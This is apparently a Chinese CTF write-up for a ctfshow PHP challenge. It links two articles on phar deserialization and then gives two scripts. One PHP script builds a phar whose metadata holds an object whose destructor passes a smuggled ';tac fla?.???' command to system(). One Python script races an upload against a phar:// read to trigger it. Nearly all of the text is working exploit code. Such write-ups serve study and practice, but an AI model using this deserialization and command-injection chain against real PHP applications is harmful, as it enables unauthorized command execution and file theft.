# 知识点
两篇介绍的文章<br />[浅析Phar反序列化 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/305292.html)<br />[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)
# 思路
phar文件生成脚本
```plsql
<?php
    unlink('phar.phar');
    class filter{
        public $filename;
        public $filecontent;
        public $evilfile=false;
        public $admin = false;

        public function __construct($f,$fn){
            $this->filename=$f;
            $this->filecontent=$fn;
        }

        public function __destruct(){
            if($this->evilfile && $this->admin){
                system('rm '.$this->filename);
            }
        }
    }
 
    $a=new filter(';tac fla?.???','1');
    $a->admin = true;
    $a->evilfile = true;
    $phar = new Phar('1.phar');
    $phar->setStub('<?php __HALT_COMPILER();?>');
    $phar->setMetadata($a);
    $phar->addFromString('1.txt','dky');
?>
```
多线程文件竞争脚本
```plsql
import requests
import threading
import time

success = False
# 获取文件数据
def getPhar(phar):
    with open(phar,'rb') as f:
        data = f.read()
        return data

# 写phar文件
def writePhar(url, data):
    requests.post(url, data)

# unlink文件
def unlinkPhar(url, data):
    global  success
    r = requests.post(url, data).text
    if 'ctfshow{' in r and success is False:
        print(r)
        success =True

def main():
    global success
    url = 'http://13837acb-ee42-43ca-9f55-2078d765f4a4.challenge.ctf.show/'
    phar = getPhar('1.phar')
    while success is False:
        time.sleep(1)
        w = threading.Thread(target=writePhar, args=(url+'?fn=1.phar', phar))
        s = threading.Thread(target=unlinkPhar, args=(url+'?fn=phar://1.phar/1.txt', ''))
        w.start()
        s.start()

if __name__ == '__main__':
    main()
```
